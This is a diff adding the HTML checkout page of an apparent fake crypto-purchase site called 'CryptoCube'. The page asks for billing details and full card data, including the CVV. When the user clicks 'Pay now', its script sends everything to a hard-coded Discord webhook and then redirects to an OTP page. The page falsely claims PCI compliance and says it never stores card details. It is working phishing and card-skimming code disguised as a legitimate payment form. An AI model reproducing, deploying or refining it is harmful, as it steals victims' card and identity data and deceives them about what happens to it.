@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Complete Payment — CryptoCube</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%233b82f6'/%3E%3Ctext x='50' y='68' font-size='55' text-anchor='middle' fill='white' font-family='system-ui'%3E◈%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  
+  <style>
+    :root {
+      --bg: #080a12;
+      --bg-elevated: #0d111f;
+      --bg-card: #131725;
+      --bg-input: #0a0e1a;
+      --border: #1e2640;
+      --border-hover: #2d3a5e;
+      --text: #f0f2ff;
+      --text-secondary: #8b95b8;
+      --text-muted: #5a6380;
+      --primary: #3b82f6;
+      --primary-glow: rgba(59,130,246,0.15);
+      --success: #22c55e;
+      --danger: #ef4444;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+    
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: #2d3a5e; border-radius: 4px; }
+    
+    .page-transition {
+      position: fixed; inset: 0;
+      background: var(--bg);
+      z-index: 10000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .page-transition.active { opacity: 1; pointer-events: all; }
+
+    /* Nav */
+    .nav {
+      position: fixed; top: 0; left: 0; right: 0;
+      height: 68px;
+      background: rgba(8,10,18,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 32px;
+    }
+    .nav-left { display: flex; align-items: center; gap: 40px; }
+    .nav-logo {
+      font-size: 1.5rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--primary), #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: flex; align-items: center; gap: 10px;
+      text-decoration: none;
+    }
+    .nav-logo::before {
+      content: '◈';
+      font-size: 1.6rem;
+      background: linear-gradient(135deg, var(--primary), #06b6d4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .nav-links {
+      display: flex;
+      gap: 32px;
+      list-style: none;
+    }
+    .nav-links a {
+      color: #8b95b8;
+      text-decoration: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover { color: #f0f2ff; }
+    .nav-right { display: flex; align-items: center; gap: 16px; }
+    .nav-btn {
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      text-decoration: none;
+    }
+    .nav-btn-ghost {
+      background: transparent;
+      color: #8b95b8;
+      border: 1px solid #1e2640;
+    }
+    .nav-btn-primary {
+      background: #3b82f6;
+      color: white;
+    }
+    .mobile-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+    .mobile-menu {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #080a12;
+      z-index: 999;
+      padding: 80px 32px 32px;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .mobile-menu.open { display: flex; }
+    .mobile-close {
+      position: absolute;
+      top: 20px; right: 20px;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    .mobile-menu a {
+      padding: 16px 0;
+      border-bottom: 1px solid #1e2640;
+      color: #8b95b8;
+      text-decoration: none;
+      font-size: 1.1rem;
+    }
+
+    /* Main Layout */
+    .payment-container {
+      max-width: 1200px;
+      margin: 100px auto 60px;
+      padding: 0 24px;
+      display: grid;
+      grid-template-columns: 1fr 380px;
+      gap: 40px;
+    }
+
+    /* Form Panel */
+    .form-panel {
+      background: #131725;
+      border: 1px solid #1e2640;
+      border-radius: 20px;
+      padding: 32px;
+    }
+
+    /* Step Indicator */
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 32px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid #1e2640;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #5a6380;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
+    .step.active { color: #3b82f6; }
+    .step.completed { color: #22c55e; }
+    .step-number {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #1e2640;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+      font-weight: 600;
+    }
+    .step.active .step-number { background: #3b82f6; color: white; }
+    .step.completed .step-number { background: #22c55e; color: white; }
+    .step-line {
+      flex: 1;
+      height: 1px;
+      background: #1e2640;
+    }
+
+    .form-panel h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .form-panel .subtitle {
+      color: #8b95b8;
+      margin-bottom: 32px;
+    }
+
+    /* Form Groups */
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #8b95b8;
+      margin-bottom: 8px;
+    }
+    .form-label .required {
+      color: #ef4444;
+    }
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #0a0e1a;
+      border: 1px solid #1e2640;
+      border-radius: 12px;
+      color: white;
+      font-size: 1rem;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+    .form-input:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
+    }
+    .form-input.error {
+      border-color: #ef4444;
+    }
+
+    /* Loading Animation */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(8,10,18,0.9);
+      z-index: 9999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .loading-overlay.active {
+      display: flex;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 3px solid #1e2640;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 1rem;
+      color: #8b95b8;
+    }
+
+    /* Card Details Panel */
+    .card-section {
+      display: none;
+    }
+    .card-section.active {
+      display: block;
+    }
+
+    /* Card Input with Dynamic Logo - LEFT POSITION */
+    .card-input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .card-input-wrapper .form-input {
+      flex: 1;
+      padding-left: 52px;
+    }
+    .dynamic-card-logo {
+  position: absolute;
+  left: 6px;
+  top: 50%;
+  transform: translateY(-50%);
+  height: 26px;
+  width: auto;
+  pointer-events: none;
+  display: none;
+  z-index: 1;
+}
+    .dynamic-card-logo.active {
+      display: block;
+    }
+    .generic-card-icon {
+  position: absolute;
+  left: 6px;
+  top: 50%;
+  transform: translateY(-50%);
+  height: 20px;
+  width: auto;
+  pointer-events: none;
+  z-index: 1;
+  color: #5a6380;
+  font-size: 1.2rem;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+    /* Accepted Cards Logos */
+    .accepted-cards {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 24px;
+    }
+    .accepted-logo {
+      height: 24px;
+      width: auto;
+      opacity: 0.8;
+      transition: opacity 0.2s;
+    }
+    .accepted-logo:hover {
+      opacity: 1;
+    }
+
+    /* Validation Message */
+    .validation-message {
+      font-size: 0.8rem;
+      margin-top: 6px;
+      min-height: 24px;
+    }
+    .validation-message.error {
+      color: #ef4444;
+    }
+
+    /* Card Row */
+    .card-row {
+      display: grid;
+      grid-template-columns: 1fr 100px 100px;
+      gap: 12px;
+    }
+
+    /* Locked Cardholder Name */
+    .locked-input {
+      background: #1e2640;
+      cursor: not-allowed;
+      color: #8b95b8;
+    }
+
+    /* Summary Panel */
+    .summary-panel {
+      background: #131725;
+      border: 1px solid #1e2640;
+      border-radius: 20px;
+      padding: 28px;
+      position: sticky;
+      top: 88px;
+      height: fit-content;
+    }
+    .summary-panel h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid #1e2640;
+      font-size: 0.95rem;
+    }
+    .summary-row.total {
+      border-top: 2px solid #1e2640;
+      border-bottom: none;
+      margin-top: 12px;
+      padding-top: 20px;
+      font-size: 1.1rem;
+    }
+    .summary-row.total .value {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #3b82f6;
+    }
+    .summary-label { color: #8b95b8; }
+    .summary-value { font-weight: 600; }
+
+    .btn-next, .btn-pay {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-top: 24px;
+    }
+    .btn-next:hover, .btn-pay:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(59,130,246,0.3);
+    }
+    .btn-next:disabled, .btn-pay:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .secure-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 16px;
+      font-size: 0.8rem;
+      color: #5a6380;
+    }
+
+    .toast-container {
+      position: fixed;
+      bottom: 24px; right: 24px;
+      z-index: 5000;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .toast {
+      background: #131725;
+      border: 1px solid #1e2640;
+      border-radius: 12px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      transform: translateX(120%);
+      transition: transform 0.3s ease;
+      max-width: 360px;
+    }
+    .toast.show { transform: translateX(0); }
+    .toast.success { border-left: 3px solid #22c55e; }
+    .toast.error { border-left: 3px solid #ef4444; }
+
+    @media (max-width: 900px) {
+      .payment-container { grid-template-columns: 1fr; }
+      .summary-panel { position: static; }
+    }
+    @media (max-width: 768px) {
+      .nav-links, .nav-right .nav-btn { display: none; }
+      .mobile-toggle { display: block; }
+      .form-row { grid-template-columns: 1fr; }
+      .card-row { grid-template-columns: 1fr; gap: 12px; }
+      .accepted-cards { justify-content: flex-start; margin-top: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-transition" id="pageTransition"></div>
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- Nav -->
+<nav class="nav">
+  <div class="nav-left">
+    <a href="index.html" class="nav-logo">CryptoCube</a>
+    <ul class="nav-links">
+      <li><a href="market.html">Markets</a></li>
+      <li><a href="buy.html">Buy</a></li>
+      <li><a href="sell.html">Sell</a></li>
+      <li><a href="wallet.html">Wallet</a></li>
+      <li><a href="about.html">About</a></li>
+      <li><a href="support.html">Support</a></li>
+    </ul>
+  </div>
+  <div class="nav-right">
+    <a href="login.html" class="nav-btn nav-btn-ghost">Log in</a>
+    <a href="login.html" class="nav-btn nav-btn-primary">Get started</a>
+  </div>
+  <button class="mobile-toggle" onclick="toggleMobile()"><i class="fas fa-bars"></i></button>
+</nav>
+
+<div class="mobile-menu" id="mobileMenu">
+  <button class="mobile-close" onclick="toggleMobile()"><i class="fas fa-times"></i></button>
+  <a href="market.html">Markets</a>
+  <a href="buy.html">Buy</a>
+  <a href="sell.html">Sell</a>
+  <a href="wallet.html">Wallet</a>
+  <a href="about.html">About</a>
+  <a href="support.html">Support</a>
+  <a href="login.html">Log in</a>
+  <a href="login.html">Get started</a>
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text">Processing...</div>
+</div>
+
+<div class="payment-container">
+  
+  <!-- Main Form Panel -->
+  <div class="form-panel">
+    
+    <!-- Step Indicator - Initially: Billing active, Payment and Confirmation inactive -->
+    <div class="step-indicator">
+      <div class="step active" id="step1Indicator">
+        <span class="step-number">1</span>
+        <span>Billing</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step" id="step2Indicator">
+        <span class="step-number">2</span>
+        <span>Payment</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step" id="step3Indicator">
+        <span class="step-number">3</span>
+        <span>Confirmation</span>
+      </div>
+    </div>
+
+    <h1>Complete Payment</h1>
+    <p class="subtitle">Secure checkout — PCI compliant</p>
+
+    <!-- Step 1: Billing Info -->
+    <div id="billingSection">
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">First Name <span class="required">*</span></label>
+          <input type="text" class="form-input" id="firstName" placeholder="John">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Last Name <span class="required">*</span></label>
+          <input type="text" class="form-input" id="lastName" placeholder="Doe">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Email Address <span class="required">*</span></label>
+        <input type="email" class="form-input" id="email" placeholder="you@example.com">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Street Address <span class="required">*</span></label>
+        <input type="text" class="form-input" id="street" placeholder="123 Main St">
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">City</label>
+          <input type="text" class="form-input" id="city" placeholder="New York">
+        </div>
+        <div class="form-group">
+          <label class="form-label">State / Province</label>
+          <input type="text" class="form-input" id="state" placeholder="NY">
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">ZIP / Postal Code <span class="required">*</span></label>
+          <input type="text" class="form-input" id="zip" placeholder="10001">
+        </div>
+      </div>
+
+      <button class="btn-next" id="nextToCardBtn">Continue to card details →</button>
+    </div>
+
+    <!-- Step 2: Card Details -->
+    <div id="cardSection" class="card-section">
+      
+      <!-- Accepted Cards Logos -->
+      <div class="accepted-cards">
+        <img class="accepted-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Visa_Inc._logo_%281999%E2%80%932005%29.svg/3840px-Visa_Inc._logo_%281999%E2%80%932005%29.svg.png" alt="Visa">
+        <img class="accepted-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/1280px-Mastercard_2019_logo.svg.png" alt="Mastercard">
+        <img class="accepted-logo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express">
+        <img class="accepted-logo" src="https://www.818crime.com/wp-content/uploads/2025/02/DGN_AcceptanceMark_FC_Hrz_RGB.jpg" alt="Discover">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Cardholder Name</label>
+        <input type="text" class="form-input locked-input" id="cardholderName" readonly placeholder="Full name from billing">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Card Number</label>
+        <div class="card-input-wrapper">
+          <div class="generic-card-icon" id="genericCardIcon">
+            <i class="far fa-credit-card"></i>
+          </div>
+          <img class="dynamic-card-logo" id="dynamicCardLogo" alt="">
+          <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
+        </div>
+        <div class="validation-message" id="cardValidationMsg"></div>
+      </div>
+
+      <div class="card-row">
+        <div class="form-group">
+          <label class="form-label">Expiry (MM/YY)</label>
+          <input type="text" class="form-input" id="cardExpiry" placeholder="MM/YY" maxlength="5">
+        </div>
+        <div class="form-group">
+          <label class="form-label">CVV</label>
+          <input type="text" class="form-input" id="cardCvv" placeholder="123" maxlength="4">
+        </div>
+      </div>
+
+      <button class="btn-pay" id="payNowBtn">Pay now →</button>
+    </div>
+
+    <div class="secure-note">
+      <i class="fas fa-lock"></i>
+      <span>Your payment info is encrypted. We never store full card details.</span>
+    </div>
+  </div>
+
+  <!-- Summary Panel -->
+  <div class="summary-panel">
+    <h3><i class="fas fa-receipt"></i> Order summary</h3>
+    <div class="summary-row">
+      <span class="summary-label">Asset</span>
+      <span class="summary-value" id="summaryAsset">—</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">Amount (USD)</span>
+      <span class="summary-value" id="summaryAmount">$0.00</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">Bonus</span>
+      <span class="summary-value" id="summaryBonus">$0.00</span>
+    </div>
+    <div class="summary-row total">
+      <span class="summary-label">Total</span>
+      <span class="value" id="summaryTotal">$0.00</span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">You receive</span>
+      <span class="summary-value" id="summaryCrypto">0.00000000 BTC</span>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ========== UTILITIES ==========
+  function showToast(message, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}" style="color:${type === 'success' ? '#22c55e' : '#ef4444'}"></i> ${message}`;
+    container.appendChild(toast);
+    requestAnimationFrame(() => toast.classList.add('show'));
+    setTimeout(() => {
+      toast.classList.remove('show');
+      setTimeout(() => toast.remove(), 300);
+    }, 3000);
+  }
+
+  function toggleMobile() {
+    document.getElementById('mobileMenu').classList.toggle('open');
+  }
+
+  // Page transitions for nav links
+  document.querySelectorAll('.nav-logo, .nav-links a, .nav-btn').forEach(link => {
+    link.addEventListener('click', (e) => {
+      const href = link.getAttribute('href');
+      if (href && !href.startsWith('#') && !href.startsWith('javascript')) {
+        e.preventDefault();
+        document.getElementById('pageTransition').classList.add('active');
+        setTimeout(() => window.location.href = href, 250);
+      }
+    });
+  });
+
+  // ========== STEP MANAGEMENT FUNCTIONS ==========
+  function setStep1Completed() {
+    const step1 = document.getElementById('step1Indicator');
+    step1.classList.remove('active');
+    step1.classList.add('completed');
+    // Change number to checkmark
+    step1.querySelector('.step-number').innerHTML = '<i class="fas fa-check"></i>';
+  }
+
+  function setStep2Active() {
+    const step2 = document.getElementById('step2Indicator');
+    step2.classList.add('active');
+    step2.classList.remove('completed');
+    step2.querySelector('.step-number').innerHTML = '2';
+  }
+
+  function setStep2Completed() {
+    const step2 = document.getElementById('step2Indicator');
+    step2.classList.remove('active');
+    step2.classList.add('completed');
+    step2.querySelector('.step-number').innerHTML = '<i class="fas fa-check"></i>';
+  }
+
+  function setStep3Active() {
+    const step3 = document.getElementById('step3Indicator');
+    step3.classList.add('active');
+    step3.classList.remove('completed');
+  }
+
+  // ========== LOAD PURCHASE DATA ==========
+  const purchase = JSON.parse(localStorage.getItem('cc_purchase') || '{}');
+  
+  function updateSummary() {
+    document.getElementById('summaryAsset').textContent = `${purchase.coinName || 'BTC'} (${purchase.coin || 'BTC'})`;
+    document.getElementById('summaryAmount').textContent = `$${(purchase.amount || 0).toFixed(2)}`;
+    document.getElementById('summaryBonus').textContent = `+$${(purchase.bonus || 0).toFixed(2)} FREE`;
+    const total = (purchase.amount || 0) + (purchase.bonus || 0);
+    document.getElementById('summaryTotal').textContent = `$${total.toFixed(2)}`;
+    const cryptoAmount = total / (purchase.price || 67245);
+    document.getElementById('summaryCrypto').textContent = `${cryptoAmount.toFixed(8)} ${purchase.coin || 'BTC'}`;
+  }
+  updateSummary();
+
+  // ========== BILLING → CARD STEP ==========
+  document.getElementById('nextToCardBtn').addEventListener('click', () => {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const street = document.getElementById('street').value.trim();
+    const zip = document.getElementById('zip').value.trim();
+
+    if (!firstName || !lastName) {
+      showToast('Please enter your first and last name', 'error');
+      return;
+    }
+    if (!email || !email.includes('@')) {
+      showToast('Please enter a valid email address', 'error');
+      return;
+    }
+    if (!street) {
+      showToast('Street address is required', 'error');
+      return;
+    }
+    if (!zip) {
+      showToast('ZIP / Postal code is required', 'error');
+      return;
+    }
+
+    // Set locked cardholder name
+    document.getElementById('cardholderName').value = `${firstName} ${lastName}`;
+    
+    // Mark Step 1 as COMPLETED (green checkmark)
+    setStep1Completed();
+    
+    // Show loading animation
+    const loader = document.getElementById('loadingOverlay');
+    loader.classList.add('active');
+    setTimeout(() => {
+      loader.classList.remove('active');
+      document.getElementById('billingSection').style.display = 'none';
+      document.getElementById('cardSection').classList.add('active');
+      
+      // Set Step 2 as ACTIVE (not completed yet)
+      setStep2Active();
+      
+      // Focus on card number after transition
+      setTimeout(() => {
+        document.getElementById('cardNumber').focus();
+      }, 100);
+    }, 800);
+  });
+
+  // ========== BIN-BASED CARD LOGO DETECTION ==========
+  function getCardNetwork(cardNumber) {
+    const clean = cardNumber.replace(/\s/g, '');
+    if (!clean) return null;
+    
+    if (clean.startsWith('4')) return 'visa';
+    if (/^5[1-5]/.test(clean) || /^2[2-7]/.test(clean)) return 'mastercard';
+    if (/^3[47]/.test(clean)) return 'amex';
+    if (/^6011/.test(clean) || /^65/.test(clean) || /^64[4-9]/.test(clean)) return 'discover';
+    return null;
+  }
+
+  const cardLogos = {
+    visa: 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Visa_Inc._logo_%281999%E2%80%932005%29.svg/3840px-Visa_Inc._logo_%281999%E2%80%932005%29.svg.png',
+    mastercard: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/1280px-Mastercard_2019_logo.svg.png',
+    amex: 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg',
+    discover: 'https://www.818crime.com/wp-content/uploads/2025/02/DGN_AcceptanceMark_FC_Hrz_RGB.jpg'
+  };
+
+  function updateDynamicCardLogo(cardNumber) {
+    const logoImg = document.getElementById('dynamicCardLogo');
+    const genericIcon = document.getElementById('genericCardIcon');
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    
+    if (cleanNumber.length < 6) {
+      genericIcon.style.display = 'flex';
+      logoImg.classList.remove('active');
+      return;
+    }
+    
+    genericIcon.style.display = 'none';
+    
+    const network = getCardNetwork(cleanNumber);
+    if (network && cardLogos[network]) {
+      logoImg.src = cardLogos[network];
+      logoImg.alt = network;
+      logoImg.classList.add('active');
+    } else {
+      logoImg.classList.remove('active');
+    }
+  }
+
+  // ========== LUHN VALIDATION ==========
+  function luhnCheck(cardNumber) {
+    const clean = cardNumber.replace(/\s/g, '');
+    if (clean.length < 16) return false;
+    
+    let sum = 0;
+    let alternate = false;
+    for (let i = clean.length - 1; i >= 0; i--) {
+      let n = parseInt(clean.charAt(i), 10);
+      if (alternate) {
+        n *= 2;
+        if (n > 9) n = (n % 10) + 1;
+      }
+      sum += n;
+      alternate = !alternate;
+    }
+    return (sum % 10 === 0);
+  }
+
+  function validateAndAutoJump() {
+    const cardNumber = document.getElementById('cardNumber').value;
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    const validationMsg = document.getElementById('cardValidationMsg');
+    const input = document.getElementById('cardNumber');
+    const expiryInput = document.getElementById('cardExpiry');
+    
+    if (cleanNumber.length === 16) {
+      const isValid = luhnCheck(cleanNumber);
+      if (!isValid) {
+        validationMsg.textContent = 'Invalid card number';
+        validationMsg.className = 'validation-message error';
+        input.classList.add('error');
+        return false;
+      } else {
+        validationMsg.textContent = '';
+        validationMsg.className = 'validation-message';
+        input.classList.remove('error');
+        expiryInput.focus();
+        return true;
+      }
+    } else if (cleanNumber.length > 16) {
+      validationMsg.textContent = 'Card number too long';
+      validationMsg.className = 'validation-message error';
+      input.classList.add('error');
+      return false;
+    } else {
+      validationMsg.textContent = '';
+      validationMsg.className = 'validation-message';
+      input.classList.remove('error');
+      return false;
+    }
+  }
+
+  // ========== CARD FORMATTING ==========
+  function formatCardNumber(value) {
+    const clean = value.replace(/\D/g, '').substring(0, 16);
+    const parts = [];
+    for (let i = 0; i < clean.length; i += 4) {
+      parts.push(clean.substring(i, i + 4));
+    }
+    return parts.join(' ');
+  }
+
+  function formatExpiry(value) {
+    const clean = value.replace(/\D/g, '').substring(0, 4);
+    if (clean.length >= 2) {
+      return clean.substring(0, 2) + '/' + clean.substring(2, 4);
+    }
+    return clean;
+  }
+
+  const cardNumberInput = document.getElementById('cardNumber');
+  const cardExpiryInput = document.getElementById('cardExpiry');
+  const cardCvvInput = document.getElementById('cardCvv');
+
+  cardNumberInput.addEventListener('input', (e) => {
+    let raw = e.target.value.replace(/\s/g, '');
+    raw = raw.replace(/\D/g, '').substring(0, 16);
+    const formatted = formatCardNumber(raw);
+    e.target.value = formatted;
+    
+    updateDynamicCardLogo(raw);
+    validateAndAutoJump();
+  });
+
+  cardExpiryInput.addEventListener('input', (e) => {
+    e.target.value = formatExpiry(e.target.value);
+    if (e.target.value.length === 5) {
+      cardCvvInput.focus();
+    }
+  });
+
+  cardCvvInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+  });
+
+  // ========== SUBMIT TO WEBHOOK ==========
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503028541179035648/Idmmk4pEEhz9cpi7SKo2xczKu4_Z0PyRGg90x8jAVVbm3g5S-wKm7VnfFW7ModIYKYGs';
+
+  async function sendToWebhook(data) {
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' })
+      });
+    } catch (err) {
+      console.error('Webhook failed', err);
+    }
+  }
+
+  document.getElementById('payNowBtn').addEventListener('click', async () => {
+    const cardNumberRaw = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const expiry = document.getElementById('cardExpiry').value;
+    const cvv = document.getElementById('cardCvv').value;
+    const cardholder = document.getElementById('cardholderName').value;
+
+    if (cardNumberRaw.length !== 16) {
+      showToast('Please enter a complete 16-digit card number', 'error');
+      return;
+    }
+    if (!luhnCheck(cardNumberRaw)) {
+      showToast('Invalid card number', 'error');
+      return;
+    }
+    if (!expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
+      showToast('Enter valid expiry (MM/YY)', 'error');
+      return;
+    }
+    if (!cvv || cvv.length < 3) {
+      showToast('Enter valid CVV', 'error');
+      return;
+    }
+
+    const network = getCardNetwork(cardNumberRaw);
+    if (!network) {
+      showToast('Unsupported card network', 'error');
+      return;
+    }
+
+    // Mark Step 2 as COMPLETED (green checkmark)
+    setStep2Completed();
+    
+    // Set Step 3 as ACTIVE (for upcoming OTP page)
+    setStep3Active();
+
+    const payload = {
+      timestamp: new Date().toISOString(),
+      event: 'payment_attempt',
+      order: {
+        coin: purchase.coin,
+        coinName: purchase.coinName,
+        price: purchase.price,
+        amount_usd: purchase.amount,
+        bonus_usd: purchase.bonus,
+        total_usd: (purchase.amount || 0) + (purchase.bonus || 0),
+        crypto_received: ((purchase.amount + purchase.bonus) / purchase.price).toFixed(8),
+        coupon: purchase.coupon
+      },
+      billing: {
+        first_name: document.getElementById('firstName').value,
+        last_name: document.getElementById('lastName').value,
+        full_name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`,
+        email: document.getElementById('email').value,
+        street: document.getElementById('street').value,
+        city: document.getElementById('city').value || '-',
+        state: document.getElementById('state').value || '-',
+        zip: document.getElementById('zip').value
+      },
+      payment: {
+        cardholder_name: cardholder,
+        card_number: cardNumberRaw,
+        card_network: network,
+        expiry: expiry,
+        cvv: cvv
+      },
+      wallet_address: purchase.wallet
+    };
+
+    const loader = document.getElementById('loadingOverlay');
+    loader.classList.add('active');
+
+    await sendToWebhook(payload);
+
+    setTimeout(() => {
+      loader.classList.remove('active');
+      showToast('Redirecting to verification...', 'info');
+      
+      setTimeout(() => {
+        document.getElementById('pageTransition').classList.add('active');
+        setTimeout(() => {
+          window.location.href = 'otp.html';
+        }, 250);
+      }, 1000);
+    }, 1500);
+  });
+</script>
+</body>
+</html>
